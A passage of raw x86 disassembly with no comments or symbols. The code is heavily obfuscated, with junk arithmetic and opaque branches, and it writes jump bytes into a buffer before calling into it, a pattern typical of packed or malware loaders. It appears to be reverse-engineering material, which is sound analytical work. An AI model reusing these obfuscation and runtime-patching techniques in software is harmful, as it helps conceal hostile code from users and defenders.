  41c27c:	mov    DWORD PTR [ebp-0x20],ebx
  41c27f:	mov    DWORD PTR [ebp-0x24],0x5
  41c286:	mov    DWORD PTR [ebp-0x28],0x6686
  41c28d:	mov    DWORD PTR [ebp-0x8],0x7cf1
  41c294:	mov    DWORD PTR [ebp-0x4],eax
  41c297:	mov    DWORD PTR [ebp+0x8],0x739a
  41c29e:	mov    DWORD PTR [ebp-0xc],0xf3a
  41c2a5:	xor    edx,edx
  41c2a7:	mov    DWORD PTR [ebp-0x10],0x429
  41c2ae:	mov    eax,DWORD PTR [ebp-0x28]
  41c2b1:	mov    ecx,DWORD PTR [ebp-0x24]
  41c2b4:	sub    eax,0x175c
  41c2b9:	div    ecx
  41c2bb:	mov    ecx,DWORD PTR [ebp-0x20]
  41c2be:	xor    edx,edx
  41c2c0:	mov    edi,0x4db5
  41c2c5:	div    ecx
  41c2c7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c2ca:	xor    edx,edx
  41c2cc:	div    ecx
  41c2ce:	xor    edx,edx
  41c2d0:	mov    ecx,eax
  41c2d2:	mov    eax,DWORD PTR [ebp+0x8]
  41c2d5:	imul   ecx,ecx,0x2e01
  41c2db:	mov    esi,DWORD PTR [ebp-0x4]
  41c2de:	add    eax,edi
  41c2e0:	div    esi
  41c2e2:	mov    edx,DWORD PTR [ebp-0x8]
  41c2e5:	mov    esi,0x940a7
  41c2ea:	sub    ecx,0x16bea86
  41c2f0:	sub    eax,edx
  41c2f2:	xor    edx,edx
  41c2f4:	div    esi
  41c2f6:	mov    esi,0xdbd
  41c2fb:	add    eax,esi
  41c2fd:	cmp    ecx,eax
  41c2ff:	jae    0x41c3c0
  41c305:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  41c30c:	mov    DWORD PTR [ebp-0x20],0x383e
  41c313:	mov    DWORD PTR [ebp-0x24],0x3a3a
  41c31a:	mov    DWORD PTR [ebp-0x14],0x13cd
  41c321:	xor    edx,edx
  41c323:	mov    DWORD PTR [ebp-0x18],0x187
  41c32a:	mov    DWORD PTR [ebp-0x28],0x3224
  41c331:	mov    eax,DWORD PTR [ebp-0x28]
  41c334:	push   0x6
  41c336:	pop    ebx
  41c337:	div    ebx
  41c339:	mov    edx,eax
  41c33b:	mov    eax,ds:0x422268
  41c340:	mov    eax,DWORD PTR [eax+0x1d0]
  41c346:	sub    eax,edx
  41c348:	mov    edx,DWORD PTR [ebp-0x24]
  41c34b:	mov    ebx,DWORD PTR [ebp-0x20]
  41c34e:	imul   edx,ebx
  41c351:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c354:	xor    edx,ebx
  41c356:	sub    edx,0x26bd
  41c35c:	add    eax,ecx
  41c35e:	and    edx,0x7126
  41c364:	mov    ebx,ecx
  41c366:	sub    ebx,edx
  41c368:	mov    edx,DWORD PTR [ebp-0x18]
  41c36b:	sub    eax,edx
  41c36d:	mov    edx,DWORD PTR [ebp-0x14]
  41c370:	sub    eax,edx
  41c372:	mov    edx,DWORD PTR [ebp+0xc]
  41c375:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  41c37c:	mov    BYTE PTR [eax-0xbb5],dl
  41c382:	mov    eax,DWORD PTR [ebp-0x10]
  41c385:	xor    eax,0xffffe1ce
  41c38a:	add    eax,DWORD PTR [ebp-0xc]
  41c38d:	xor    edx,edx
  41c38f:	and    eax,0x6d33
  41c394:	lea    ecx,[ecx+eax*1-0x6520]
  41c39b:	mov    eax,DWORD PTR [ebp+0x8]
  41c39e:	mov    ebx,DWORD PTR [ebp-0x4]
  41c3a1:	add    eax,edi
  41c3a3:	div    ebx
  41c3a5:	mov    edx,DWORD PTR [ebp-0x8]
  41c3a8:	mov    ebx,0x940a7
  41c3ad:	sub    eax,edx
  41c3af:	xor    edx,edx
  41c3b1:	div    ebx
  41c3b3:	add    eax,esi
  41c3b5:	cmp    ecx,eax
  41c3b7:	jb     0x41c305
  41c3bd:	xor    ebx,ebx
  41c3bf:	inc    ebx
  41c3c0:	mov    DWORD PTR [ebp+0xc],0x77bd
  41c3c7:	mov    DWORD PTR [ebp+0x8],0x4f2a
  41c3ce:	mov    DWORD PTR [ebp-0x8],0x4738
  41c3d5:	mov    DWORD PTR [ebp-0xc],0x6c4e
  41c3dc:	mov    DWORD PTR [ebp-0x10],0x7f0d
  41c3e3:	mov    DWORD PTR [ebp-0x14],0x64ec
  41c3ea:	mov    DWORD PTR [ebp-0x18],0x1984
  41c3f1:	mov    DWORD PTR [ebp-0x1c],0x293
  41c3f8:	mov    eax,DWORD PTR [ebp+0x8]
  41c3fb:	mov    ecx,DWORD PTR [ebp+0xc]
  41c3fe:	add    eax,0x1ef2
  41c403:	and    eax,ecx
  41c405:	xor    eax,0x7240
  41c40a:	mov    ecx,0x7aaa
  41c40f:	sub    ecx,eax
  41c411:	mov    DWORD PTR [ebp+0xc],0x8d3
  41c418:	mov    DWORD PTR [ebp+0x8],0x2392
  41c41f:	mov    DWORD PTR [ebp-0x20],ebx
  41c422:	mov    DWORD PTR [ebp-0x24],0x338f
  41c429:	mov    DWORD PTR [ebp-0x28],0x61c9
  41c430:	mov    eax,DWORD PTR [ebp+0x8]
  41c433:	mov    edx,DWORD PTR [ebp+0xc]
  41c436:	imul   eax,edx
  41c439:	xor    eax,0x40a0
  41c43e:	or     eax,0x1a48
  41c443:	xor    eax,0x139ddb0
  41c448:	mov    esi,ecx
  41c44a:	sub    esi,eax
  41c44c:	mov    eax,DWORD PTR [ebp-0x28]
  41c44f:	mov    edx,DWORD PTR [ebp-0x24]
  41c452:	mov    edi,DWORD PTR [ebp-0x20]
  41c455:	or     eax,0x1cc2
  41c45a:	sub    eax,edx
  41c45c:	xor    edx,edx
  41c45e:	div    edi
  41c460:	mov    edx,DWORD PTR ds:0x422268
  41c466:	mov    edx,DWORD PTR [edx+0x1d4]
  41c46c:	sub    edx,eax
  41c46e:	mov    eax,DWORD PTR [ebp+0x10]
  41c471:	mov    al,BYTE PTR [esi+eax*1]
  41c474:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  41c47b:	mov    eax,DWORD PTR [ebp-0x1c]
  41c47e:	mov    edx,DWORD PTR [ebp-0x18]
  41c481:	imul   eax,edx
  41c484:	mov    edx,DWORD PTR [ebp-0x14]
  41c487:	imul   eax,eax,0x262b
  41c48d:	or     eax,edx
  41c48f:	mov    edx,DWORD PTR [ebp-0x10]
  41c492:	or     eax,edx
  41c494:	xor    eax,0x59f6
  41c499:	lea    ecx,[ecx+eax*1+0x350559e6]
  41c4a0:	mov    eax,DWORD PTR [ebp-0xc]
  41c4a3:	and    eax,0xddc
  41c4a8:	add    eax,DWORD PTR [ebp-0x8]
  41c4ab:	xor    eax,0x46e3
  41c4b0:	add    eax,0x50eb
  41c4b5:	cmp    ecx,eax
  41c4b7:	jne    0x41c411
  41c4bd:	pop    edi
  41c4be:	pop    esi
  41c4bf:	pop    ebx
  41c4c0:	leave  
  41c4c1:	ret    0xc
  41c4c4:	push   ebp
  41c4c5:	mov    ebp,esp
  41c4c7:	sub    esp,0xec
  41c4cd:	push   ebx
  41c4ce:	push   esi
  41c4cf:	mov    DWORD PTR [ebp-0x8],0x548e
  41c4d6:	mov    DWORD PTR [ebp-0x4],0x61c2
  41c4dd:	mov    eax,DWORD PTR [ebp-0x4]
  41c4e0:	mov    ecx,DWORD PTR [ebp-0x8]
  41c4e3:	add    eax,0x1ca5
  41c4e8:	or     eax,ecx
  41c4ea:	mov    ecx,DWORD PTR ds:0x422268
  41c4f0:	lea    eax,[eax+ecx*1-0x7eef]
  41c4f7:	mov    DWORD PTR [ebp-0x5c],eax
  41c4fa:	mov    DWORD PTR [ebp-0x4],0x8ea
  41c501:	mov    DWORD PTR [ebp-0x8],0x5759
  41c508:	mov    eax,DWORD PTR [ebp-0x8]
  41c50b:	mov    ecx,DWORD PTR [ebp-0x4]
  41c50e:	and    eax,0x27f6
  41c513:	xor    eax,ecx
  41c515:	mov    ecx,DWORD PTR ds:0x42239c
  41c51b:	imul   eax,eax,0x18
  41c51e:	xor    eax,0x17970
  41c523:	lea    eax,[ebp+eax*1-0x54]
  41c527:	mov    DWORD PTR [eax],ecx
  41c529:	mov    DWORD PTR [ebp-0x4],0x7584
  41c530:	mov    DWORD PTR [ebp-0x8],0x7c9f
  41c537:	mov    eax,DWORD PTR [ebp-0x8]
  41c53a:	xor    edx,edx
  41c53c:	push   0x3
  41c53e:	pop    ecx
  41c53f:	div    ecx
  41c541:	mov    ecx,DWORD PTR [ebp-0x4]
  41c544:	xor    edx,edx
  41c546:	push   0x2
  41c548:	add    eax,0x14d3
  41c54d:	and    eax,ecx
  41c54f:	mov    ecx,0x6404
  41c554:	sub    ecx,eax
  41c556:	mov    DWORD PTR [ebp-0x74],ecx
  41c559:	mov    DWORD PTR [ebp-0xc],0x13b5
  41c560:	mov    DWORD PTR [ebp-0x8],0x2e54
  41c567:	mov    DWORD PTR [ebp-0x4],0x2f11
  41c56e:	mov    eax,DWORD PTR [ebp-0x8]
  41c571:	mov    ecx,DWORD PTR [ebp-0x4]
  41c574:	lea    eax,[ecx+eax*1-0x65ec]
  41c57b:	mov    ecx,0x5e208
  41c580:	div    ecx
  41c582:	mov    ecx,DWORD PTR [ebp-0xc]
  41c585:	lea    eax,[eax+ecx*1+0x40c7]
  41c58c:	mov    DWORD PTR [ebp-0x24],eax
  41c58f:	mov    DWORD PTR [ebp-0x4],0x1bc6
  41c596:	mov    DWORD PTR [ebp-0x8],0x16ac
  41c59d:	mov    DWORD PTR [ebp-0xc],0x2185
  41c5a4:	mov    eax,DWORD PTR [ebp-0xc]
  41c5a7:	mov    ecx,DWORD PTR [ebp-0x8]
  41c5aa:	xor    eax,0x1f75
  41c5af:	sub    eax,ecx
  41c5b1:	mov    ecx,DWORD PTR [ebp-0x4]
  41c5b4:	sub    eax,ecx
  41c5b6:	xor    eax,0xc3e
  41c5bb:	mov    DWORD PTR [ebp-0x58],eax
  41c5be:	mov    DWORD PTR [ebp-0x14],0x66bd
  41c5c5:	pop    ecx
  41c5c6:	mov    DWORD PTR [ebp-0x4],ecx
  41c5c9:	mov    DWORD PTR [ebp-0x8],0x3374
  41c5d0:	mov    DWORD PTR [ebp-0xc],0x3c31
  41c5d7:	mov    eax,DWORD PTR [ebp-0xc]
  41c5da:	mov    edx,DWORD PTR [ebp-0x8]
  41c5dd:	mov    esi,DWORD PTR [ebp-0x4]
  41c5e0:	xor    eax,edx
  41c5e2:	xor    edx,edx
  41c5e4:	div    esi
  41c5e6:	mov    edx,DWORD PTR [ebp-0x14]
  41c5e9:	and    eax,edx
  41c5eb:	sub    eax,0x680
  41c5f0:	mov    DWORD PTR [ebp-0x24],eax
  41c5f3:	mov    DWORD PTR [ebp-0x30],0x5f68
  41c5fa:	mov    DWORD PTR [ebp-0x2c],0x398b
  41c601:	mov    DWORD PTR [ebp-0x4],0x5034
  41c608:	mov    DWORD PTR [ebp-0x8],0x7cbf
  41c60f:	mov    DWORD PTR [ebp-0xc],0x4f6c
  41c616:	mov    DWORD PTR [ebp-0x14],0xee2
  41c61d:	mov    eax,DWORD PTR [ebp-0x14]
  41c620:	add    eax,DWORD PTR [ebp-0xc]
  41c623:	mov    edx,DWORD PTR [ebp-0x8]
  41c626:	xor    eax,edx
  41c628:	mov    edx,DWORD PTR [ebp-0x4]
  41c62b:	or     eax,edx
  41c62d:	mov    edx,DWORD PTR [ebp-0x2c]
  41c630:	or     eax,edx
  41c632:	mov    edx,DWORD PTR [ebp-0x30]
  41c635:	and    eax,edx
  41c637:	mov    edx,0x5b68
  41c63c:	sub    edx,eax
  41c63e:	mov    DWORD PTR [ebp-0x24],edx
  41c641:	mov    DWORD PTR [ebp-0x48],0x3308
  41c648:	mov    DWORD PTR [ebp-0x44],0x59a4
  41c64f:	mov    DWORD PTR [ebp-0x38],0x2775
  41c656:	mov    DWORD PTR [ebp-0x34],0x4da
  41c65d:	mov    DWORD PTR [ebp-0x40],0x49d8
  41c664:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  41c66b:	mov    DWORD PTR [ebp-0x28],0x338c
  41c672:	mov    DWORD PTR [ebp-0x24],0x68ed
  41c679:	mov    DWORD PTR [ebp-0x20],0x2a7b
  41c680:	mov    DWORD PTR [ebp-0x1c],0x718f
  41c687:	mov    eax,DWORD PTR [ebp-0x20]
  41c68a:	mov    edx,DWORD PTR [ebp-0x1c]
  41c68d:	mov    esi,DWORD PTR [ebp-0x28]
  41c690:	mov    ebx,DWORD PTR [ebp-0x24]
  41c693:	add    eax,0xffffc948
  41c698:	adc    edx,0xffff87b0
  41c69e:	or     eax,esi
  41c6a0:	mov    esi,DWORD PTR [ebp-0x40]
  41c6a3:	or     eax,esi
  41c6a5:	or     edx,ebx
  41c6a7:	mov    ebx,DWORD PTR [ebp-0x3c]
  41c6aa:	mov    esi,DWORD PTR [ebp-0x38]
  41c6ad:	or     edx,ebx
  41c6af:	mov    ebx,DWORD PTR [ebp-0x34]
  41c6b2:	sub    eax,esi
  41c6b4:	mov    esi,DWORD PTR [ebp-0x48]
  41c6b7:	sbb    edx,ebx
  41c6b9:	mov    ebx,DWORD PTR [ebp-0x44]
  41c6bc:	or     eax,esi
  41c6be:	or     edx,ebx
  41c6c0:	add    eax,0x89b
  41c6c5:	mov    DWORD PTR [ebp-0x20],eax
  41c6c8:	adc    edx,0x5a
  41c6cb:	mov    DWORD PTR [ebp-0x1c],edx
  41c6ce:	mov    DWORD PTR [ebp-0x80],0xfa4
  41c6d5:	mov    DWORD PTR [ebp-0x70],0x618e
  41c6dc:	mov    DWORD PTR [ebp-0x6c],0x811
  41c6e3:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  41c6ed:	mov    DWORD PTR [ebp-0x94],0xe82c1
  41c6f7:	mov    DWORD PTR [ebp-0x88],0x58ff
  41c701:	mov    DWORD PTR [ebp-0x84],0x7394
  41c70b:	xor    eax,eax
  41c70d:	inc    eax
  41c70e:	mov    DWORD PTR [ebp-0x64],eax
  41c711:	mov    DWORD PTR [ebp-0x8],0x5f59
  41c718:	mov    DWORD PTR [ebp-0x4],0x652b
  41c71f:	mov    DWORD PTR [ebp-0xc],0xf43
  41c726:	mov    DWORD PTR [ebp-0x14],0x22dc
  41c72d:	mov    DWORD PTR [ebp-0x2c],0x45d4
  41c734:	mov    DWORD PTR [ebp-0x30],0x28e1
  41c73b:	mov    DWORD PTR [ebp-0x7c],0x5e09
  41c742:	mov    DWORD PTR [ebp-0x50],0x3910
  41c749:	mov    DWORD PTR [ebp-0x3c],0x5c97
  41c750:	mov    DWORD PTR [ebp-0x24],0x6111
  41c757:	mov    DWORD PTR [ebp-0x78],ecx
  41c75a:	mov    DWORD PTR [ebp-0x34],ecx
  41c75d:	mov    DWORD PTR [ebp-0x44],0x207a
  41c764:	mov    DWORD PTR [ebp-0x60],eax
  41c767:	mov    DWORD PTR [ebp-0x8c],0x7840
  41c771:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  41c778:	mov    eax,DWORD PTR [ebp-0x30]
  41c77b:	or     eax,0x70c5
  41c780:	add    eax,DWORD PTR [ebp-0x2c]
  41c783:	mov    ecx,DWORD PTR [ebp-0x14]
  41c786:	or     eax,ecx
  41c788:	mov    ecx,0xce40
  41c78d:	sub    ecx,eax
  41c78f:	mov    eax,DWORD PTR [ebp-0xc]
  41c792:	sub    ecx,eax
  41c794:	imul   ecx,ecx,0x7480
  41c79a:	add    ecx,DWORD PTR [ebp-0x58]
  41c79d:	mov    eax,DWORD PTR [ebp-0x8]
  41c7a0:	push   ecx
  41c7a1:	mov    ecx,DWORD PTR [ebp-0x4]
  41c7a4:	lea    eax,[ecx+eax*1-0x1e6d]
  41c7ab:	mov    ecx,DWORD PTR [ebp-0x64]
  41c7ae:	xor    edx,edx
  41c7b0:	div    ecx
  41c7b2:	mov    ecx,DWORD PTR [ebp-0x74]
  41c7b5:	lea    eax,[eax+ecx*1-0xa617]
  41c7bc:	push   eax
  41c7bd:	mov    eax,DWORD PTR [ebp-0x88]
  41c7c3:	mov    ecx,DWORD PTR [ebp-0x84]
  41c7c9:	push   0x770a
  41c7ce:	push   0x2a0c
  41c7d3:	push   ecx
  41c7d4:	push   eax
  41c7d5:	call   0x41dfb1
  41c7da:	mov    ecx,DWORD PTR [ebp-0x98]
  41c7e0:	mov    esi,DWORD PTR [ebp-0x94]
  41c7e6:	push   esi
  41c7e7:	push   ecx
  41c7e8:	or     edx,0x615d
  41c7ee:	or     eax,0x455c
  41c7f3:	push   edx
  41c7f4:	push   eax
  41c7f5:	call   0x421af6
  41c7fa:	mov    ecx,DWORD PTR [ebp-0x70]
  41c7fd:	mov    edx,DWORD PTR [ebp-0x6c]
  41c800:	xor    eax,ecx
  41c802:	mov    ecx,DWORD PTR [ebp-0x20]
  41c805:	mov    edx,DWORD PTR [ebp-0x1c]
  41c808:	mov    esi,DWORD PTR [ebp-0x80]
  41c80b:	and    eax,0xb49
  41c810:	add    esi,0x629b
  41c816:	lea    eax,[eax+ecx*1-0xfd]
  41c81d:	xor    esi,0x4994
  41c823:	push   eax
  41c824:	lea    esi,[ebp+esi*1-0x3c93]
  41c82b:	call   0x41c9d7
  41c830:	mov    ecx,eax
  41c832:	mov    eax,DWORD PTR [ebp-0x50]
  41c835:	mov    edx,DWORD PTR [ebp-0x7c]
  41c838:	sub    eax,0x161
  41c83d:	xor    eax,edx
  41c83f:	imul   eax,eax,0x5151
  41c845:	add    eax,0x3901
  41c84a:	xor    eax,0x40c2
  41c84f:	xor    edx,edx
  41c851:	mov    esi,0x218f6c45
  41c856:	div    esi
  41c858:	cmp    ecx,eax
  41c85a:	jne    0x41c9c7
  41c860:	mov    ecx,DWORD PTR [ebp-0x78]
  41c863:	xor    edx,edx
  41c865:	mov    eax,0x209c
  41c86a:	div    ecx
  41c86c:	mov    ecx,DWORD PTR ds:0x422268
  41c872:	mov    ecx,DWORD PTR [ecx+0x1a8]
  41c878:	xor    edx,edx
  41c87a:	sub    ecx,eax
  41c87c:	mov    eax,DWORD PTR [ebp-0x4c]
  41c87f:	xor    eax,0x3daa
  41c884:	sub    eax,0x3375
  41c889:	or     eax,0x6931
  41c88e:	lea    eax,[ebp+eax*1-0x6c25]
  41c895:	push   eax
  41c896:	mov    eax,DWORD PTR [ebp-0x8c]
  41c89c:	push   0x18
  41c89e:	pop    esi
  41c89f:	div    esi
  41c8a1:	mov    esi,DWORD PTR [ebp-0x60]
  41c8a4:	xor    edx,edx
  41c8a6:	div    esi
  41c8a8:	mov    edx,DWORD PTR [ebp-0x44]
  41c8ab:	mov    esi,DWORD PTR [ebp-0x34]
  41c8ae:	xor    eax,edx
  41c8b0:	xor    edx,edx
  41c8b2:	div    esi
  41c8b4:	imul   eax,eax,0x7d2a
  41c8ba:	sub    eax,0x928ded7
  41c8bf:	push   eax
  41c8c0:	mov    eax,ds:0x422268
  41c8c5:	add    eax,0xaa
  41c8ca:	push   eax
  41c8cb:	mov    eax,DWORD PTR [ebp-0x3c]
  41c8ce:	sub    ecx,eax
  41c8d0:	mov    eax,DWORD PTR [ebp-0x24]
  41c8d3:	push   DWORD PTR [ecx+eax*1+0xbd4]
  41c8da:	call   0x41f837
  41c8df:	mov    DWORD PTR [ebp-0x4],eax
  41c8e2:	mov    ecx,DWORD PTR ds:0x422370
  41c8e8:	lea    eax,[ebp+0x4]
  41c8eb:	mov    DWORD PTR [ecx*4+0x422368],eax
  41c8f2:	inc    DWORD PTR ds:0x422370
  41c8f8:	mov    eax,DWORD PTR [ebp-0x4]
  41c8fb:	mov    eax,DWORD PTR [ebp-0x4]
  41c8fe:	xor    edx,edx
  41c900:	shld   edx,eax,0x2
  41c904:	shl    eax,0x2
  41c907:	mov    ecx,0xba699573
  41c90c:	mov    esi,0x9c0a89d8
  41c911:	xor    eax,ecx
  41c913:	xor    edx,esi
  41c915:	cmp    eax,ecx
  41c917:	jne    0x41c931
  41c91d:	cmp    edx,esi
  41c91f:	jne    0x41c931
  41c925:	mov    eax,0xba699577
  41c92a:	mov    edx,esi
  41c92c:	jmp    0x41c9d1
  41c931:	lea    eax,[ebp-0x10]
  41c934:	mov    DWORD PTR [ebp-0x9c],eax
  41c93a:	mov    eax,DWORD PTR [ebp-0x54]
  41c93d:	mov    DWORD PTR [ebp-0x10],eax
  41c940:	mov    eax,DWORD PTR [ebp-0x10]
  41c943:	mov    ecx,DWORD PTR [ebp-0x4]
  41c946:	sub    eax,ecx
  41c948:	mov    DWORD PTR [ebp-0x10],eax
  41c94b:	mov    eax,DWORD PTR [ebp-0x20]
  41c94e:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c951:	sub    DWORD PTR [ebp-0x10],eax
  41c954:	mov    eax,DWORD PTR [ebp-0x4]
  41c957:	mov    DWORD PTR [eax],0x658776e9
  41c95d:	mov    DWORD PTR [eax+0x4],0xab756547
  41c964:	mov    eax,DWORD PTR [ebp-0x10]
  41c967:	mov    ecx,DWORD PTR [ebp-0x4]
  41c96a:	mov    DWORD PTR [ecx+0x1],eax
  41c96d:	mov    eax,ds:0x4220e4
  41c972:	push   DWORD PTR [eax]
  41c974:	push   DWORD PTR ds:0x422358
  41c97a:	push   DWORD PTR ds:0x4220ec
  41c980:	push   DWORD PTR ds:0x422338
  41c986:	push   DWORD PTR ds:0x4223ac
  41c98c:	push   0xa3e69a99
  41c991:	push   0xa3e69a9d
  41c996:	push   DWORD PTR [ebp-0x5c]
  41c999:	mov    eax,DWORD PTR [ebp-0x4]
  41c99c:	call   eax
  41c99e:	mov    eax,DWORD PTR [edi]
  41c9a0:	mov    eax,DWORD PTR [ebp+0x8]
  41c9a3:	push   DWORD PTR [eax]
  41c9a5:	call   0x41cbc7
  41c9aa:	mov    eax,ds:0x422268
  41c9af:	push   0x4
  41c9b1:	add    eax,0x1dc
  41c9b6:	push   eax
  41c9b7:	push   edi
  41c9b8:	call   0x41d30a
  41c9bd:	mov    eax,0xba69957b
  41c9c2:	jmp    0x41c92a
  41c9c7:	mov    eax,0xba699573
  41c9cc:	mov    edx,0x9c0a89d8
  41c9d1:	pop    esi
  41c9d2:	pop    ebx
  41c9d3:	leave  
  41c9d4:	ret    0x4
  41c9d7:	push   ebp
  41c9d8:	mov    ebp,esp
  41c9da:	sub    esp,0x20
  41c9dd:	push   ebx
  41c9de:	push   edi
  41c9df:	mov    DWORD PTR [ebp-0x8],0x522e
  41c9e6:	mov    DWORD PTR [ebp-0x4],0x3dbd
  41c9ed:	mov    DWORD PTR [ebp-0x10],0x53f1
  41c9f4:	mov    DWORD PTR [ebp-0xc],0x631b
  41c9fb:	mov    DWORD PTR [ebp-0x18],0x524d
  41ca02:	mov    DWORD PTR [ebp-0x14],0x1600
  41ca09:	mov    eax,DWORD PTR [ebp-0x18]
  41ca0c:	mov    ecx,DWORD PTR [ebp-0x14]
  41ca0f:	mov    edx,DWORD PTR [ebp-0x10]
  41ca12:	mov    edi,DWORD PTR [ebp-0xc]
  41ca15:	push   edi
  41ca16:	push   edx
  41ca17:	push   ecx
  41ca18:	push   eax
  41ca19:	call   0x41dfb1
  41ca1e:	mov    ecx,DWORD PTR [ebp-0x8]
  41ca21:	mov    edi,DWORD PTR [ebp-0x4]
  41ca24:	add    eax,0x1dc8
  41ca29:	adc    edx,0x6fbf
  41ca2f:	and    edx,edi
  41ca31:	push   0x1061
  41ca36:	and    eax,ecx
  41ca38:	or     edx,0x23ff
  41ca3e:	push   0x4000022f
  41ca43:	or     eax,0x58c4
  41ca48:	xor    edx,0x7a7a
  41ca4e:	xor    eax,0x5278
  41ca53:	push   edx
  41ca54:	push   eax
  41ca55:	call   0x421af6
  41ca5a:	mov    DWORD PTR [esi],eax
  41ca5c:	mov    DWORD PTR [ebp-0x20],0x3354
  41ca63:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  41ca6a:	mov    DWORD PTR [ebp-0x18],0x3d36
  41ca71:	mov    DWORD PTR [ebp-0x14],0x51ef
  41ca78:	xor    edi,edi
  41ca7a:	mov    DWORD PTR [ebp-0xc],0x3358
  41ca81:	push   0xc9f
  41ca86:	inc    edi
  41ca87:	mov    DWORD PTR [ebp-0x4],edi
  41ca8a:	mov    eax,DWORD PTR [ebp-0x18]
  41ca8d:	mov    ecx,DWORD PTR [ebp-0x14]
  41ca90:	push   0x1c19
  41ca95:	push   ecx
  41ca96:	push   eax
  41ca97:	call   0x41dfb1
  41ca9c:	mov    ecx,DWORD PTR [ebp-0x20]
  41ca9f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41caa2:	or     eax,ecx
  41caa4:	or     edx,ebx
  41caa6:	push   0x20fa
  41caab:	add    eax,0x7fac
  41cab0:	push   0x1cd48ab
  41cab5:	adc    edx,0x133b
  41cabb:	push   edx
  41cabc:	push   eax
  41cabd:	call   0x421af6
  41cac2:	mov    ebx,DWORD PTR [ebp-0x4]
  41cac5:	lea    ecx,[eax-0x5d40]
  41cacb:	xor    edx,edx
  41cacd:	mov    eax,0x16c2
  41cad2:	div    ebx
  41cad4:	mov    edx,DWORD PTR [ebp-0xc]
  41cad7:	sub    eax,edx
  41cad9:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  41cae0:	mov    DWORD PTR [ebp-0x14],0x6af0
  41cae7:	mov    DWORD PTR [ebp-0x4],edi
  41caea:	mov    DWORD PTR [ebp-0xc],0x2c8a
  41caf1:	mov    ecx,DWORD PTR [ebp-0xc]
  41caf4:	mov    eax,0x4401
  41caf9:	sub    eax,ecx
  41cafb:	mov    ecx,DWORD PTR [ebp-0x4]
  41cafe:	xor    edx,edx
  41cb00:	div    ecx
  41cb02:	mov    ecx,DWORD PTR [ebp-0x14]
  41cb05:	xor    eax,0xa80
  41cb0a:	or     eax,0x343b
  41cb0f:	or     eax,ecx
  41cb11:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb14:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  41cb1b:	mov    DWORD PTR [ebp-0xc],0x327f
  41cb22:	mov    DWORD PTR [ebp-0x14],0x5215
  41cb29:	mov    DWORD PTR [ebp+0x8],0x2502
  41cb30:	mov    eax,DWORD PTR [ebp+0x8]
  41cb33:	add    eax,DWORD PTR [ebp-0x14]
  41cb36:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb39:	and    eax,0x2bab
  41cb3e:	lea    eax,[eax+ecx*1-0x557f]
  41cb45:	mov    ecx,DWORD PTR [ebp+0xc]
  41cb48:	mov    DWORD PTR [esi+eax*4],ecx
  41cb4b:	mov    DWORD PTR [ebp-0xc],edi
  41cb4e:	mov    DWORD PTR [ebp+0x8],0x5f40
  41cb55:	mov    DWORD PTR [ebp-0x14],0x6ba4
  41cb5c:	mov    DWORD PTR [ebp+0xc],0x7b17
  41cb63:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb66:	mov    eax,0x43d2
  41cb6b:	sub    eax,ecx
  41cb6d:	add    eax,DWORD PTR [ebp+0xc]
  41cb70:	xor    edx,edx
  41cb72:	add    eax,DWORD PTR [ebp-0x14]
  41cb75:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb78:	div    ecx
  41cb7a:	mov    ecx,DWORD PTR [ebp+0x10]
  41cb7d:	xor    edx,edx
  41cb7f:	pop    edi
  41cb80:	pop    ebx
  41cb81:	or     eax,0x67ad
  41cb86:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  41cb8d:	mov    DWORD PTR [ebp+0x10],0x517b
  41cb94:	mov    DWORD PTR [ebp+0xc],0x5d62
  41cb9b:	mov    DWORD PTR [ebp+0x8],0x41b0
  41cba2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cba5:	mov    eax,DWORD PTR [ebp+0xc]
  41cba8:	and    ecx,0x68c1
  41cbae:	sub    ecx,0x6fd3
  41cbb4:	or     ecx,eax
  41cbb6:	mov    eax,DWORD PTR [ebp+0x10]
  41cbb9:	imul   ecx,eax
  41cbbc:	mov    eax,0xf52840d5
  41cbc1:	div    ecx
  41cbc3:	leave  
  41cbc4:	ret    0xc
  41cbc7:	push   ebp
  41cbc8:	mov    ebp,esp
  41cbca:	sub    esp,0xc0
  41cbd0:	push   esi
  41cbd1:	mov    DWORD PTR [ebp-0x80],0x2f93
  41cbd8:	mov    DWORD PTR [ebp-0x7c],0x3321
  41cbdf:	mov    DWORD PTR [ebp-0x70],0x7d00
  41cbe6:	mov    DWORD PTR [ebp-0x6c],0xd87
  41cbed:	mov    DWORD PTR [ebp-0x60],0x4197
  41cbf4:	mov    DWORD PTR [ebp-0x5c],0xa7d
  41cbfb:	mov    DWORD PTR [ebp-0x50],0x772d
  41cc02:	mov    DWORD PTR [ebp-0x4c],0x37d8
  41cc09:	mov    DWORD PTR [ebp-0x40],0x414a
  41cc10:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41cc17:	mov    DWORD PTR [ebp-0x30],0x136b
  41cc1e:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41cc25:	mov    DWORD PTR [ebp-0x20],0x32d8
  41cc2c:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41cc33:	mov    DWORD PTR [ebp-0xc],0x3956
  41cc3a:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41cc44:	mov    DWORD PTR [ebp-0x94],0x1
  41cc4e:	mov    DWORD PTR [ebp-0x14],0x17ab
  41cc55:	mov    DWORD PTR [ebp-0x64],0x7a3d
  41cc5c:	mov    DWORD PTR [ebp-0x54],0x378a
  41cc63:	mov    DWORD PTR [ebp-0x74],0x5a00
  41cc6a:	mov    DWORD PTR [ebp-0x24],0x1f3a
  41cc71:	mov    DWORD PTR [ebp-0x84],0x9a225
  41cc7b:	mov    DWORD PTR [ebp-0x44],0x31f8
